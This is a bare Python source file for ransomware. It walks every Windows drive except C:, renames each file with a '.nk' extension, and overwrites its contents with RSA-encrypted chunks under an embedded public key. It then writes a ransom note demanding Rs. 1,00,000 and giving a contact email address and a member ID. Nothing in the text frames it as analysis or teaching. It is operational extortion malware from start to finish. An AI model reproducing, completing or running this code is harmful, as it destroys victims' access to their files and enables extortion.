global publicKey
m_id = '1234567891'
publicKey = 'PublicKey(109822860789870844316884291014028487631706866376856306676841538191768724971827223477901623720192337167546804413524695205390871360713772469809988517750373624794475364064020834966889904779465550095426503072116848979995821591181252297255808041197424746629695028333177063567892712763996986103499337604843920247679, 65537)'

import os
import rsa
import pickle

t = publicKey.split(', ')
n = int((t[0])[10:])
e = int((t[1])[:-1])

def encrypt():
    global publicKey

    for part in range(65, 91):
        if part != 67:
            partpath = chr(part) + ":\\"
            try:
                for dirpath, dirs, files in os.walk(partpath, topdown = True):
                    dirpath = dirpath + "\\"
                    for filename in files:
                        i = 0
                        x = {}
                        fname = dirpath + filename
                        if filename != "e" + m_id + ".exe":
                            nfname = fname + ".nk"
                            os.rename(fname, nfname)
                            with open(nfname, 'rb') as f:
                                while True:
                                    data = f.read(117)
                                    if data:
                                        ct = rsa.encrypt(data, rsa.key.PublicKey(n, e))
                                        x[i] = ct
                                        i += 1
                                    else:
                                        break
                            with open(nfname, 'wb') as f:
                                pickle.dump(x, f)
            except:
                pass

encrypt()
with open("nk_readme.txt", 'w') as f:
    f.write("YOUR FILES ARE ENCRYPTED !!!\n")
    f.write("WANT TO GAIN ASSCESS AGAIN ?\n")
    f.write("CONTACT US AT tnkrish02@gmail.com WITH YOUR MEMBER ID\n")
    f.write("YOU WILL NEED TO PAY RS. 1,00,000 ONLY\n")
    f.write("MEMEBER ID : ")
    f.write(m_id)
    f.write("\n")
